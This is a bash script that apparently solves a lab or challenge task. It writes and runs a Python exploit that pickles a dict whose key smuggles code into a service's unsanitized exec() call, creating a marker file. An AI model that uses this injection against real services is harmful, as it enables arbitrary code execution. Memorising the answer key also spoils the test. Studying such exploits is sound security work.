#!/bin/bash
set -euo pipefail

cat > /app/exploit.py << 'PYEOF'
#!/usr/bin/env python3
"""Exploit for the pickle-gadget-chain task.

The SafeUnpickler correctly blocks dangerous classes via find_class().
However, persist() passes dict KEYS unsanitized into exec():

    exec(f"stored_{key} = {value!r}")

A key like: x = None; open('/app/pwned.txt','w').write('pwned')  #
causes exec() to run injected code. The pickle just needs to produce
a dict with this key — trivially possible since builtins.dict is allowed.
"""
import pickle


def generate_payload() -> bytes:
    malicious_key = "x = None; open('/app/pwned.txt', 'w').write('pwned')  #"
    return pickle.dumps({malicious_key: "harmless"}, protocol=2)


if __name__ == '__main__':
    payload = generate_payload()
    with open('/app/exploit.pkl', 'wb') as f:
        f.write(payload)
    print(f"Wrote {len(payload)} bytes to /app/exploit.pkl")
PYEOF

python3 /app/exploit.py
python3 /app/service.py < /app/exploit.pkl
echo "Exploit ran. /app/pwned.txt:"
cat /app/pwned.txt
